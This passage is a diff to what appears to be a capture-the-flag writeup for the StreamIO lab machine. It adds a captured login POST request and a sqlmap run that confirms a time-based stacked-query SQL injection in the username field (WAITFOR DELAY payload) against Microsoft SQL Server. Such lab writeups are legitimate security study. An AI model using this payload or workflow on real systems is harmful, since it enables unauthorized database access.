@@ -124,7 +124,7 @@ Only accessable through includes
 ```
 
 ---
-## Foothold
+## SQL injection
 
 How you gained initial access to the machine.
 
@@ -134,10 +134,89 @@ Description of the vulnerability exploited.
 
 ### Exploitation
 
-Step-by-step exploitation with commands.
+```
+POST /login.php HTTP/2
+Host: streamio.htb
+Cookie: PHPSESSID=0jdod8f7qlb5le0t4h91nofbs9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Origin: https://streamio.htb
+Referer: https://streamio.htb/login.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+username=test&password=test
+                                 
+```
 
 ```shell
-# Commands used
+sqlmap -r req3.txt --batch --force-ssl
+        ___
+       __H__                                                                                                                                                                                                                                
+ ___ ___[)]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
+|_ -| . [']     | .'| . |                                                                                                                                                                                                                   
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:21:28 /2026-09-30/
+
+[14:21:28] [INFO] parsing HTTP request from 'req3.txt'
+[14:21:28] [INFO] testing connection to the target URL
+[14:21:28] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:21:28] [INFO] testing if the target URL content is stable
+[14:21:28] [INFO] target URL content is stable
+[14:21:28] [INFO] testing if POST parameter 'username' is dynamic
+[14:21:29] [WARNING] POST parameter 'username' does not appear to be dynamic
+[14:21:29] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[14:21:29] [INFO] testing for SQL injection on POST parameter 'username'
+[14:21:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:21:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:21:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[14:21:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[14:21:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[14:21:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[14:21:33] [INFO] testing 'Generic inline queries'
+[14:21:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[14:21:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[14:21:45] [INFO] POST parameter 'username' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
+it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] Y
+[14:21:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:21:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:21:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: username=test';WAITFOR DELAY '0:0:5'--&password=test
+---
+[14:22:04] [INFO] testing Microsoft SQL Server
+[14:22:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[14:22:09] [INFO] confirming Microsoft SQL Server
+[14:22:15] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 10 or 2019 or 11 or 2016 or 2022
+web application technology: Microsoft IIS 10.0, PHP 7.2.26
+back-end DBMS: Microsoft SQL Server 2019
+[14:22:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/streamio.htb'
+[14:22:15] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:22:15 /2026-09-30/
+
+
 ```
 
 ---
